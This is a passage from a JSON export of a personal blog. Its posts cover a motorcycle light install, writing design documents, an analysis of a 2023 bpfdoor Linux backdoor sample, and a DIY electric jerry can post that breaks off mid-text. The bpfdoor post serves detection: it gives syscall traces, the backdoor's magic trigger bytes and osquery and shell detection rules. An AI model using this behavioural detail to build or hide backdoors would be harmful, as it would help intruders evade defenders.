you remove the rear wheel, you can instead access the small channel underneath the plastic:\n\n![](https://i.snap.as/Cw1UQhrn.jpg)\n\nOnce you put humpty dumpty back together again, it will look something like this:\n\n![](https://i.snap.as/MiJEmDhk.jpg)\n\nWhile I don’t love the visible tie wraps on the mudguard holder, I also don’t love removing and reinstalling the rear wheel.\n\nI suspect I could have likely gotten a cleaner install by tapping closer to the fuse blocks, but I was trying to stay out of the high-voltage area of the bike.\n\n---\n\n## In Closing\n\nThe Skene lights were a pain to install but well worth the added visibility. If I was to criticize anything, it'd be the wire boot on the Photon Blaster LED lights and the fact that when the turn signal is on, both the Photon Blasters will display an alternate flashing pattern.","tags":[],"images":["https://i.snap.as/ucmfIMdD.jpg","https://i.snap.as/7hYeyHHs.jpg","https://i.snap.as/JT537emH.jpg","https://i.snap.as/rEZK5Kxj.jpg","https://i.snap.as/rRDvVdux.jpg","https://i.snap.as/2v8k8JR6.jpg","https://i.snap.as/eP43KGBJ.jpg","https://i.snap.as/N04Wc3lh.jpg","https://i.snap.as/SE963ky0.jpg","https://i.snap.as/N96XQQ0V.jpg","https://i.snap.as/n1kKL9fj.jpg","https://i.snap.as/k2H9Zz5t.jpg","https://i.snap.as/NSxFDObr.jpg","https://i.snap.as/qhqYV6JO.jpg","https://i.snap.as/FqBiZ46x.jpg","https://i.snap.as/XIqfSeOt.jpg","https://i.snap.as/luEZFie5.jpg","https://i.snap.as/atm4pXNX.jpg","https://i.snap.as/NScDC402.jpg","https://i.snap.as/trQeMOuO.jpg","https://i.snap.as/hfi5eK6M.jpg","https://i.snap.as/bxOyzqIY.jpg","https://i.snap.as/Cw1UQhrn.jpg","https://i.snap.as/MiJEmDhk.jpg"],"paid":false,"full_post_url":"","views":687,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"l09udi1ddi95bxsj","slug":"elements-of-a-readable-design-document","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-06-06T13:13:57Z","updated":"2023-06-06T15:27:39Z","title":"Writing Readable Design Docs","body":"A reposting from my Google Doc at \u003chttps://tinyurl.com/readable-dd\u003e\n\n## **Why bother?**\n\n_**Circulating a design document is like putting your idea up for code review.**_\n\nSubmitting ideas to the scrutiny of peer review is your team's best defense against engineering incompatible with its principles.\n\nAll humans have blind spots. Your goal as an author is to gather enough input to reveal them before execution. Issues found during design are [6X cheaper](https://www.researchgate.net/publication/255965523_Integrating_Software_Assurance_into_the_Software_Development_Life_Cycle_SDLC) to fix than during implementation:\n\n![](https://i.snap.as/tN45o8UW.png)\n\nThe questions that reviewers should have in their mind while reading the document are:\n\n* Does this fit with my organization's principles?\n* Could the proposed implementation be made simpler?\n* Are there alternative approaches to consider?\n* What additional concerns should be addressed?\n\n\u003c!--more--\u003e\n\n## 10 Elements of Readable Design Documents\n\n### 1. Optimized for reading\n\n_**Be respectful of your reader's time.**_\n\nDesign documents should be just long enough to convey your novel idea and no longer.  The longer your design document, the less likely it is to be read and understood.\n\nIf your design document is over seven pages long, relocate supporting content into separate documents and add hyperlinks. If your design document is over 10 pages long, you are not respecting your reader's time.\n\n### 2. Grounded by context\n\nWhy do we need this thing?\n\nDesign documents often have a shelf-life of 5-10 years and may be read by hundreds of engineers. _**Write design documents for the engineers that come after you.**_\n\nProvide a Background section to ground all readers in the same context that you have as an author. This section should describe how this became a problem, why it is worth solving, and whether anyone has previously attempted to solve it. This section should not reference the proposed design.\n\n### 3. Focused content\n\n_**Most design documents should not include code or configuration examples.**_\n\nIf an example is critical to understanding a design (for example, a new API or config file format), show an example or two, but stay under 20 lines total.\n\nIncluding code encourages [bike-shedding](https://exceptionnotfound.net/bikeshedding-the-daily-software-anti-pattern/) and distracts reviewers from reviewing the novel portions of your design and architecture. Code changes are better reviewed down the line using code-review tools, where more context is available.\n\n### 4. Considers alternatives\n\nThe most critical section of a design document is the enumeration of ideas imagined and why they are no longer being considered. This section sends a message to prospective reviewers that you've done your homework and should serve to answer the question: \"Is this solution sized appropriately?\"\n\n_**Your reviewers should be confident that your proposal is no more complicated than necessary and not simpler than required.**_\n\n### 5. Consistently structured\n\nTo promote easy reading and ensure that the most important topics are covered, introduce a standard design document template within your organization. Here's my ideal set to start with, roughly based on Google's own internal structure:\n\n* **Objective:** 1-2 line description of the impact you intend this new design to have\n* **Background:** What context is necessary to understand this design? Assume the reader is brand-new to the project. Do not mention your proposed solution.\n* **Goals/Non-Goals:** A bulleted list of your goals and what problems you do not intend to solve. This section helps illustrate design constraints.\n* **Detailed Design:** This is where you describe the novel part of your design.\n* **Alternatives Considered:** What ideas did you consider and discard?\n* **(Reliability|Security|Privacy) Considerations:** optional. Include where helpful.\n\nNoticeably missing are planning-related sections, as they come after design approval and are better tracked elsewhere. Keep your template concise and well-scoped to encourage folks to design early and design often.\n\n### 6. Collaborative\n\nTo cover your blind spots, pair up with a co-author early on.\n\nShare your design document widely before it is fully polished.  Encourage peers to suggest improvements or make them directly. In my experience, Sharing a Google Doc invites more collaboration and comments than sharing a pull request.\n\nWhen feedback is light, set aside 10 minutes at the beginning of your next team meeting for attendees to read your document and add comments.\n\n### 7. Measured Success\n\nHow will you prove whether or not this design was successful? Don't make the reviewer guess: paint them a picture of success.\n\nIf this design intends to replace an existing system, include the deprecation of the previous system and comparisons to the existing behavior. For example:\n\n* $new_system handles 100% of requests within 1ms (vs 100ms)\n* $old_system code base is deleted\n\nBonus points if you add a hyperlink to the authoritative data source.\n\n### 8. Visual\n\nUse this one strange trick to make your design doc memorable and encourage further reading: add an image.\n\n![](https://i.snap.as/NBuZa0uF.jpg)\n\nIt doesn't really matter what the image is, but consider adding a simple diagram to convey how your system interacts with others. If you can't come up with a diagram, insert a relevant meme or photo of your dog. People will remember it.\n\n### 9. Legible\n\nDo not assume that every reader is a native English speaker.\n\nUnderstanding new ideas is difficult enough in a native language and doubly so when it isn't in your native language. Do not make non-native readers suffer through poor grammar or slang.\n\nJust as you would run a lint-checker on code, use a grammar checker to find text that may confuse readers.  Many free options exist, from Google Docs to [VS Code plug-ins](https://valentjn.github.io/vscode-ltex/) to purpose-driven solutions such as [Grammarly](https://grammarly.com/).\n\n### 10. Annotated\n\nDesign docs should declare who the authors are, the design, when it was written, and where within the review process it is.  \\\\\n\nYour design document will move across different document repositories over its lifetime, so don't rely on revision control or Google Docs metadata, which may not be visible to the reader.\n\n### References\n\n* [Design Docs at Google](https://www.industrialempathy.com/posts/design-docs-at-google/) by [Malte Ubl](https://www.industrialempathy.com/about/)\n* [Oxide Computer Company: RFD 1 Requests for Discussion](https://oxide.computer/blog/rfd-1-requests-for-discussion/) by Jessica Frazelle\n\n---\n\n## Appendix: Example Design Doc Template\n\n**Note for reviewers**\n\nWhile reviewing this proposal, focus on answering for yourself:\n\nDoes this proposal fit with our engineering principles?\n\nAre there unexplored concerns with this design, such as reliability or usability issues?\n\nCould the proposed implementation be made simpler?\n\nAre there other alternatives to consider?\n\n**Summary**\n\n1-2 sentence summary of the idea, including the expected impact if implemented.\n\n**Background**\n\nThe background serves to ground all readers in the same context that you have as an author. You should describe how the problem came to be, why it's worth solving, and whether there were previous attempts to solve it. Assume that the reader is new to this project but not the company.\n\nDefine or add hyperlinks to terms the reader may not yet be familiar with.\n\n**Goals**\n\n* A bulleted list of specific goals for this proposal\n* How will we know that this proposal has succeeded?\n* Include specific, measurable outcomes that can be cited or tracked on a dashboard.\n\n**Non-Goals**\n\nA bulleted list of what is out of scope for this proposal\n\nIs there something specific that is too difficult to solve at this time?\n\n**Detailed design**\n\nThis section constitutes the bulk of the RFC and is typically 1-4 pages long. It should focus on the novel implementation idea and specific corner cases.\n\n**Drawbacks**\n\nThere are tradeoffs to choosing any path: this is where you identify them. Why should we not implement this design? Consider costs in additional complexity, training, reliability, and dollars.\n\n**Alternatives Considered**\n\nThis is the most critical section of an RFC. It serves as an enumeration of ideas imagined that were determined to be suboptimal.\n\nThis section lets readers know you have done your homework and helps them assess if the solution is sized appropriately.\n\n**Title of Alternative #1**\n\nWhat other ideas did you consider and discard? What is the impact of not taking this approach?","tags":[],"images":["https://i.snap.as/tN45o8UW.png","https://i.snap.as/NBuZa0uF.jpg"],"paid":false,"full_post_url":"","views":137,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"n1053gnxswswmali","slug":"fun-with-the-new-bpfdoor-2023","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-05-14T02:12:18Z","updated":"2023-05-14T15:00:51Z","title":"Fun with the new bpfdoor (2023)","body":"I was recently provided a sample of the recently announced [stealthier variant of bpfdoor](https://www.deepinstinct.com/blog/bpfdoor-malware-evolves-stealthy-sniffing-backdoor-ups-its-game), malware targeting Linux that is almost certainly a state-funded Chinese threat actor ([Red Menshen](https://malpedia.caad.fkie.fraunhofer.de/actor/red_menshen)). The sample analyzed was   [a8a32ec29a31f152ba20a30eb483520fe50f2dce6c9aa9135d88f7c9c511d7](https://www.virustotal.com/gui/file/afa8a32ec29a31f152ba20a30eb483520fe50f2dce6c9aa9135d88f7c9c511d7), detectable by 11 of 62 detectors on VirusTotal.\n\nI was particularly curious what the bpfdoor surface area looked like, and if it was easy it was to detect using existing open-source tools and common Linux command-line utilities.\n\n![](https://i.snap.as/XIxA7RGD.jpg)\n\nTo experiment,  I used my favorite VM manager on macOS or Linux for this analysis: [Lima](https://github.com/lima-vm/lima), with the default Ubuntu 22.10 image.\n\n\u003c!--more--\u003e\n\n## Running bpfdoor as a regular user\n\nI first ran bpfdoor as an unprivileged user to see what system calls would be executed:\n\n```shell\nstrace -o /tmp/st.user -f ./x.bin\n```\n\nI've removed the less interesting lines of output, but the program does astonishingly little:\n\n```log\n2655  execve(\"./x.bin\", [\"./x.bin\"], 0x7fff9dad6ff8 /* 23 vars */) = 0\n2655  openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3\n2655  openat(AT_FDCWD, \"/var/run/initd.lock\", O_RDWR|O_CREAT, 0666) = -1 EACCES (Permission denied)\n2655  flock(-1, LOCK_EX|LOCK_NB)        = -1 EBADF (Bad file descriptor)\n2655  clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7ff8d1b39a10) = 2656\n2655  +++ exited with 0 +++\n2656  close(0)                          = 0\n2656  close(1)                          = 0\n2656  close(2)                          = 0\n2656  setsid()                          = 2656\n2656  getrandom(\"\\xa4\\xd5\\x9d\\x71\\xb3\\xe0\\x98\\xe1\", 8, GRND_NONBLOCK) = 8\n2656  socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) = -1 EPERM (Operation not permitted)\n2656  exit_group(0)                     = ?\n2656  +++ exited with 0 +++\n```\n\nThe only noteworthy things here are:\n\n* It tries to create /var/run/initd.lock but fails because it requires root\n* It tries to set up a raw socket to listen to all protocols but fails because it requires root.\n* It forks into the background via `clone()` and `setsid()`.\n\nIt's not unusual to see a bug with the flock() call to fd=-1 because openat() returned an error rather than a file handle.\n\n## Running as root\n\n```log\n2669  openat(AT_FDCWD, \"/var/run/initd.lock\", O_RDWR|O_CREAT, 0666) = 3\n2669  flock(3, LOCK_EX|LOCK_NB)         = 0\n2669  clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fb6d948ba10) = 3319\n2669  exit_group(0 \u003cunfinished ...\u003e\n3319  close(0 \u003cunfinished ...\u003e\n2669  +++ exited with 0 +++\n3319  close(1)                          = 0\n3319  close(2)                          = 0\n3319  setsid()                          = 3319\n3319  getrandom(\"\\x6c\\x07\\x1c\\x75\\x6b\\xae\\xfe\\xdf\", 8, GRND_NONBLOCK) = 8\n3319  socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)) = 0\n3319  setsockopt(0, SOL_SOCKET, SO_ATTACH_FILTER, {len=30, filter=0x7ffd2270fa90}, 16) = 0\n3319  recvfrom(0, \"RUU\\341\\314\\22RU\\300\\250\\5\\2\\10\\0E\\0\\0Lp\\220\\0\\0@\\6~\\272\\300\\250\\5\\2\\300\\250\"..., 65536, 0, NULL, NULL) = 90\n3319  recvfrom(0, \"RUU\\341\\314\\22RU\\300\\250\\5\\2\\10\\0E\\0\\0(p\\221\\0\\0@\\6~\\335\\300\\250\\5\\2\\300\\250\"..., 65536, 0, NULL, NULL) = 54\n3319  recvfrom(0, \"RUU\\341\\314\\22RU\\300\\250\\5\\2\\10\\0E\\0\\0Lp\\222\\0\\0@\\6~\\270\\300\\250\\5\\2\\300\\250\"..., 65536, 0, NULL, NULL) = 90\n3319  recvfrom(0, \"RUU\\341\\314\\22RU\\300\\250\\5\\2\\10\\0E\\0\\0(p\\223\\0\\0@\\6~\\333\\300\\250\\5\\2\\300\\250\"..., 65536, 0, NULL, NULL) = 54\n```\n\nFirst, it opens a lock, which works this time:\n\n```shell\n-rw-r--r-- 1 root root 0 May 13 12:45 /run/initd.lock\n```\n\nAs mentioned in the [bpfdoor analysis by deep instinct](https://www.deepinstinct.com/blog/bpfdoor-malware-evolves-stealthy-sniffing-backdoor-ups-its-game), we can see that it sets a BPF filter via `setsockopt()`, and loops waiting for the magic byte sequence: `\\x44\\x30\\xCD\\x9F\\x5E\\x14\\x27\\x66`.\n\nOne thing I find fascinating is how simple the initialization is: the [previous iteration of bpfdoor](https://www.elastic.co/security-labs/a-peek-behind-the-bpfdoor) did so much more in the name of \"stealth\":\n\n* copies itself to `/dev/shm`\n* renaming itself in the process table via `prctl`\n* deletes itself from disk\n* timestomping\n\nRed Menshen must have noticed that every method for achieving stealth is also a reliable detection method. So, the new bpfdoor keeps it simple by not trying to be stealthy. In fact, this binary does so little that it's suspicious. In 2023, most advanced evasion methods are not worth it on Linux: it is good enough to hide in plain sight.\n\n## Detection\n\nUsing the `make detect` rule from \n[osquery-detection-kit](https://github.com/chainguard/osquery-detection-kit), I examined which existing rules would alert on the presence of the latest bpfdoor. 3 of them did:\n\n* [unexpected raw socket](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/execution/unexpected-raw-socket.sql): unexpected packet sniffers, just like this one! Near-zero false-positive rate.\n\n* [recently created executables](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/execution/recently-created-executables-linux.sql): programs executed within 45 seconds of when it likely landed on disk, based on ctime and btime. This catch-all has found every malware it's encountered, but it requires a comprehensive exception list.\n\n* [unexpected /var/run file](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/evasion/unexpected-var-run-linux.sql): Inspired by reading the bpfdoor technical analysis, it's good to see this fired when faced with the real thing.\n\nThat said, I think we can do better. Let's see what the malware looks like from /proc.\n\n## Exploring bpfdoor using /proc\n\nTo get an idea of what I can use for further detecting bpfdoor, I wanted to see how it was seen via /proc. First, what libraries does it link against? Based on the report, I'm not expecting anything other than libc:\n\n```shell\n% sudo cat /proc/3319/maps\n\n00400000-00448000 r-xp 00000000 fc:01 3210                               /tmp/x.bin\n00648000-00649000 r--p 00048000 fc:01 3210                               /tmp/x.bin\n00649000-0064a000 rw-p 00049000 fc:01 3210                               /tmp/x.bin\n0064a000-0066a000 rw-p 00000000 00:00 0 \n00c36000-00c57000 rw-p 00000000 00:00 0                                  [heap]\n7fb6d9200000-7fb6d9222000 r--p 00000000 fc:01 3648                       /usr/lib/x86_64-linux-gnu/libc.so.6\n7fb6d9222000-7fb6d939b000 r-xp 00022000 fc:01 3648                       /usr/lib/x86_64-linux-gnu/libc.so.6\n7fb6d939b000-7fb6d93f2000 r--p 0019b000 fc:01 3648                       /usr/lib/x86_64-linux-gnu/libc.so.6\n7fb6d93f2000-7fb6d93f6000 r--p 001f1000 fc:01 3648                       /usr/lib/x86_64-linux-gnu/libc.so.6\n7fb6d93f6000-7fb6d93f8000 rw-p 001f5000 fc:01 3648                       /usr/lib/x86_64-linux-gnu/libc.so.6\n7fb6d93f8000-7fb6d9405000 rw-p 00000000 00:00 0 \n7fb6d948b000-7fb6d948e000 rw-p 00000000 00:00 0 \n7fb6d9495000-7fb6d9497000 rw-p 00000000 00:00 0 \n7fb6d9497000-7fb6d9498000 r--p 00000000 fc:01 3645                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7fb6d9498000-7fb6d94c1000 r-xp 00001000 fc:01 3645                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7fb6d94c1000-7fb6d94cb000 r--p 0002a000 fc:01 3645                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7fb6d94cb000-7fb6d94cd000 r--p 00034000 fc:01 3645                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7fb6d94cd000-7fb6d94cf000 rw-p 00036000 fc:01 3645                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7ffd226f0000-7ffd22711000 rw-p 00000000 00:00 0                          [stack]\n7ffd22720000-7ffd22724000 r--p 00000000 00:00 0                          [vvar]\n7ffd22724000-7ffd22726000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]\n```\n\nWhat about open file handles?\n\n```shell\n% sudo lsof -p 3319\n\nCOMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nx.bin   3319 root  cwd    DIR   0,52      200    9 /tmp/lima/osquery-defense-kit/out\nx.bin   3319 root  rtd    DIR  252,1     4096    2 /\nx.bin   3319 root  txt    REG  252,1   302576 3210 /tmp/x.bin\nx.bin   3319 root  mem    REG  252,1  2072888 3648 /usr/lib/x86_64-linux-gnu/libc.so.6\nx.bin   3319 root  mem    REG  252,1   228720 3645 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\nx.bin   3319 root    0u  pack  33049      0t0  ALL type=SOCK_RAW\nx.bin   3319 root    3u   REG   0,25        0 1322 /run/initd.lock\n```\n\nlsof is handy, but to see the raw socket from /proc, we need to do a little bit more digging:\n\n```shell\n# cat /proc/net/packet\n\nsk               RefCnt Type Proto  Iface R Rmem   User   Inode\nffff92d346ba6800 3      3    88cc   2     1 0      100    19458 \nffff92d34631d800 3      3    0003   0     1 241920 0      33089 \n```\n\nThe `Inode` field is misleading, but you can use it to find the associated process ID via:\n\n```shell\n$ sudo find /proc -type l -lname \"socket:\\[33089\\]\" 2\u003e/dev/null\n\n/proc/3319/task/3319/fd/0\n/proc/3319/fd/0\n```\n\nAlternatively, you can use this to see all filehandles for the process ID:\n\n```shell\n$ ls -la /proc/3319/fd\n\ntotal 0\ndr-x------ 2 root root  0 May 13 13:03 .\ndr-xr-xr-x 9 root root  0 May 13 13:03 ..\nlrwx------ 1 root root 64 May 13 13:03 0 -\u003e 'socket:[33089]'\nlrwx------ 1 root root 64 May 13 13:03 3 -\u003e /run/initd.lock\n```\n\nOnce you have a process ID, you can resolve the path to the program:\n\n```shell\nsudo ls -lad /proc/3319/exe\n\nlrwxrwxrwx 1 root root 0 May 14 00:48 /proc/3319/exe -\u003e /tmp/x.bin\n```\n\n## Exploring bpfdoor using strings\n\nRunning `strings \u003cpath\u003e` reveals some interesting messages:\n\n```log\n[-] Execute command failed\n/var/run/initd.lock\n```\n\nlibtom/libtomcrypt has been bundled in, so we see lines such as:\n\n```log\nLTC_ARGCHK '%s' failure on line %d of file %s\nX.509v%i certificate\n  Issued by: [%s]%s (%s)\n  Issued to: [%s]%s (%s, %s)\n  Subject: %s\n  Validity: %s - %s\n  OCSP: %s\n  Serial number:\n...\nLibTomCrypt 1.17 (Tom St Denis, tomstdenis@gmail.com)\nLibTomCrypt is public domain software.\nBuilt on Oct  4 2022 at 16:09:32\n```\n\nThat last string is important: this iteration of bpfdoor could have been wandering around Cyberspace since October 2022 (7 months ago) without detection. It also appears that the bad guys used Red Hat Enterprise Linux 7.0 (nearly 10 years old!) to build the binary:\n\n```log\nGCC: (GNU) 4.8.5 20150623 (Red Hat 4.8.5-44)\n```\n\n## New detection possibilities\n\nAfter looking at /proc, a couple of new detection ideas came up:\n\n* Programs with /var/run lock files open\n* Root processes with a socket and no shared libraries\n* World-readable lock files in /var/run\n* Minimalist socket users with few open files \n* Processes where fd 0 is a non-UNIX socket\n\nThere are certainly more possibilities depending on how this backdoor is launched: for example, based on cwd or cgroup. I have not yet seen information published on how this backdoor is actually executed.\n\nI implemented each of these detection ideas: once for osquery to use in production, and once in shell just for fun. The osquery queries have been tested across Ubuntu, Fedora, Arch Linux, and NixOS, and the shell scripts have only been tested on Ubuntu.\n\n### Programs with /run lock files left open\n\nIt's unusual for a program to have an open file in /var/run, but I suspect this may eventually find a false positive. Here's an osquery and a shell script to find these:\n\n```sql\nSELECT p.* FROM processes p JOIN process_open_files pof ON p.pid = pof.pid AND pof.path LIKE \"/run/%.lock\";\n```\n\n```shell\nsudo find /proc -lname \"/run/*.lock\" 2\u003e/dev/null\n```\n\n### Root processes with a socket and no shared libraries\n\nMost programs that use a socket are either fully static, or import a library like OpenSSL. bpfdoor isn't either. Here is another osquery and shell pair:\n\n```sql\nSELECT p.*,\n    COUNT(DISTINCT pmm.path) AS pmm_count\nFROM processes p\n    JOIN process_open_sockets pos ON p.pid = pos.pid\n    LEFT JOIN process_memory_map pmm ON p.pid = pmm.pid\n    AND pmm.path LIKE \"%.so.%\"\n    -- Yes, this is a weird performance optimization\nWHERE p.pid IN (\n        SELECT pid\n        FROM processes\n        WHERE p.euid = 0\n            AND p.path NOT IN (\n                '/usr/bin/containerd',\n                '/usr/bin/fusermount3',\n                '/usr/sbin/acpid',\n                '/usr/sbin/mcelog',\n                '/usr/bin/docker-proxy'\n            )\n    )\nGROUP BY pos.pid -- libc.so, ld-linux\nHAVING pmm_count = 2;\n```\n\n```shell\ncd /proc || exit\n\nfor pid in *; do\n    [[ ! -f ${pid}/exe || ${pid} =~ \"self\" ]] \u0026\u0026 continue\n\n    euid=$(grep Uid /proc/${pid}/status | awk '{ print $2 }')\n    [[ \"${euid}\" != 0 ]] \u0026\u0026 continue\n\n    sockets=$(sudo find /proc/${pid}/fd -lname \"socket:*\" | wc -l)\n    [[ \"${sockets}\" == 0 ]] \u0026\u0026 continue\n\n    libs=$(sudo find /proc/${pid}/map_files/ -type l -lname \"*.so.*\" -exec readlink {} \\; | sort -u | wc -l)\n    [[ \"${libs}\" != 2 ]] \u0026\u0026 continue\n\n    path=$(readlink /proc/$pid/exe)\n    name=$(cat /proc/$pid/comm)\n    echo \"euid=0 process with sockets and no libs: ${name} [${pid}] at ${path}\"\ndone\n```\n\n### World readable lock files in /var/run\n\nTypically lock files are readable only by the root user. Malware often uses very relaxed file permissions.\n\n```sql\nSELECT * FROM file WHERE path LIKE \"/tmp/%.lock\" AND mode = \"0644\";\n```\n\n```shell\nfind /run/*.lock -perm 644\n```\n\n### Minimalist socket users with few open files\n\nThis creative query reveals minimalist programs that behave like a backdoor might: \n\n* have 0-1 open files\n* have 1-2 sockets open\n\nIt's an uncommon situation, but it is bound to have false positives in software that is designed in a way that each process has a specific role:\n\n```sql\nSELECT p.pid,\n    p.path,\n    p.name,\n    p.start_time,\n    GROUP_CONCAT(DISTINCT pos.protocol) AS protocols,\n    pof.path AS pof_path,\n    COUNT(DISTINCT pos.fd) AS scount,\n    COUNT(DISTINCT pof.path) AS fcount,\n    GROUP_CONCAT(DISTINCT pof.path) AS open_files,\n    p.cgroup_path\nFROM processes p\n    JOIN process_open_sockets pos ON p.pid = pos.pid\n    AND pos.protocol \u003e 0\n    LEFT JOIN process_open_files pof ON p.pid = pof.pid\nWHERE p.start_time \u003c (strftime('%s', 'now') -60)\nAND p.path NOT IN (\n    '/bin/registry',\n    '/usr/bin/docker-proxy',\n    '/usr/sbin/chronyd',\n    '/usr/sbin/cups-browsed',\n    '/usr/sbin/cupsd',\n    '/usr/sbin/sshd'\n)\nAND p.path NOT LIKE '/nix/store/%-openssh-%/bin/sshd'\nGROUP BY p.pid\nHAVING scount \u003c= 2\n    AND fcount \u003c= 1;\n```\n\n```shell\ncd /proc || exit\n\nfor pid in *; do\n    [[ ! -f ${pid}/exe || ${pid} =~ \"self\" ]] \u0026\u0026 continue\n\n    fds=$(find /proc/${pid}/fd -lname \"/*\" | wc -l)\n    [[ \"${fds}\" == 0 ]] \u0026\u0026 continue\n    [[ \"${fds}\" -gt 1 ]] \u0026\u0026 continue\n\n    # WARNING: ss -xp will print two fds on the same line if connected. Use grep -o instead of -c\n    #ss -xp | grep -v \"^u_\" | grep -o pid=${pid},\"\n\n    all_sockets=$(find /proc/${pid}/fd -lname \"socket:*\" | wc -l)\n    [[ \"${all_sockets}\" -gt 2 ]] \u0026\u0026 continue\n\n    # this isn't exactly what we want - ss doesn't show TYPE=sock of protocol=UNIX :(\n    unix_sockets=$(ss -ap | grep \"^u_\" | grep -o \"pid=${pid},\" | wc -l)\n    sockets=$(($all_sockets - $unix_sockets))\n\n    [[ \"${sockets}\" == 0 ]] \u0026\u0026 continue\n    [[ \"${sockets}\" -gt 2 ]] \u0026\u0026 continue\n\n    path=$(readlink /proc/$pid/exe)\n    [[ \"${path}\" == \"/usr/sbin/sshd\" ]] \u0026\u0026 continue\n\n    name=$(cat /proc/$pid/comm)\n    echo \"minimalist socket user (${sockets} sockets and ${fds} files): ${name} [${pid}] at ${path}\"\ndone\n\n```\n\n### fd0 is a socket\n\nI've saved my favorite for last. File descriptor 0 is usually stdin, but in bpfdoors case, it is actually the socket it uses to listen to traffic on. I've never seen this behavior before outside of bpfdoor:\n\n```sql\nSELECT * FROM process_open_sockets WHERE fd=0 AND family != 1;\n```\n\n```shell\ncd /proc || exit\n\nfor pid in *; do\n    [[ ! -f ${pid}/exe || ${pid} =~ \"self\" ]] \u0026\u0026 continue\n\n    ino=$(readlink /proc/$pid/fd/0 | grep -o 'socket:.*' | cut -d\"[\" -f2 | cut -d\"]\" -f1)\n    grep -q \" ${ino}\" /proc/$pid/net/unix \u0026\u0026 continue\n\n    path=$(readlink /proc/$pid/exe)\n    name=$(cat /proc/$pid/comm)\n    echo \"fd0 is a socket: ${name} [${pid}] at ${path}\"\ndone\n```\n\n## Final Thoughts\n\nUltimately, I was happy to see that this variant was detectable using osquery-defense-kit, and even happier that I could add additional rules to find future similar malware. Two philosophical viewpoints are critical to success in detection:\n\n* Knowing what is considered normal in your environment\n* Evasion is a means of detection\n\nIf you are interested in open-source queries that can find bpfdoor and other unusual programs, check out:\n\n* https://github.com/chainguard-dev/osquery-defense-kit/\n* https://github.com/tstromberg/sunlight\n\nThanks to [Kevin Beaumont](https://cyberplace.social/@GossiTheDog) for providing the bpfdoor sample for analysis.","tags":["ss"],"categories":[{"hashtag":"ss","slug":"ss","title":"ss","post_count":0}],"images":["https://i.snap.as/XIxA7RGD.jpg"],"paid":false,"full_post_url":"","views":1382,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"r4xuzr93i2l5cw54","slug":"diy-electric-jerry-can","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-05-12T02:07:39Z","updated":"2023-05-12T12:33:04Z","title":"DIY Electric Jerry Can","body":"In the 1930s, Vinzenz Grünvogel designed the _Wehrmacht-Einheitskanister_: an ingenious container that was stackable, carried liquid without spilling and was easy to carry. The design was so popular that nations around the world copied it, and in the United States, it became known as a “Jerry Can” (Jerry being slang for “German”).\n\nThis project shares none of those attributes.\n\n![](https://i.snap.as/rvh9B0ox.jpg)\n\n\u003c!--more--\u003e\n\n### The Range Anxiety Problem\n\n\nBefore I bought the[ BMW CE-04](https://www.bmwmotorcycles.com/en/models/urban_mobility/ce04.html) — an insanely fun electric scooter, I knew there would be range issues. With a relatively small 8.2kWh battery, the range varies highly depending on the speed of the road you are traveling on:\n\n* 35mph (55km/h) → 75 miles (120 km) of range\n* 55mph (90km/h) → 60 miles (95 km) of range\n* 75mph (120km/h) → 40 miles (65 km) of range\n\n![](https://i.snap.as/CTLEu5Y1.jpg)\n\nUnlike larger EVs, this scooter does not give you a range estimate for a destination or direct you to EV chargers when running low. If you are going to use a short-range EV for long-distance trips, you will need to plan ahead using tools like[ ABetterRoutePlanner](https://abetterrouteplanner.com/) and PlugShare.\n\nEven with proper planning, you can find yourself in a situation where you consume more charge than you’ve planned: for example, by speeding or taking a wrong turn onto a 70 mph highway.\n\n### The rough plan\n\nLong-distance “Adventure” motorcyclists often pack a[ small fuel canister for emergencies](https://twistedthrottle.com/shop/luggage/fuel-bottles-and-mounts/msr-30oz-fuel-bottle/). Jeep drivers often bring full-sized Jerry Cans. Why not do the same for EVs?\n\nIt’s easy enough to find large power banks: Jackery, Anker, EcoFlow, and Goal-Zero will all happily sell you one. The challenge was finding a power bank that stored enough charge to be helpful (800 - 1200 kWh) and could fit in the helmet compartment of the CE-04. After taking measurements, I was confident that the[ Jackery 1000](https://www.jackery.com/products/explorer-1000-portable-power-station) might just work, so I waited for it to go on sale.\n\n### 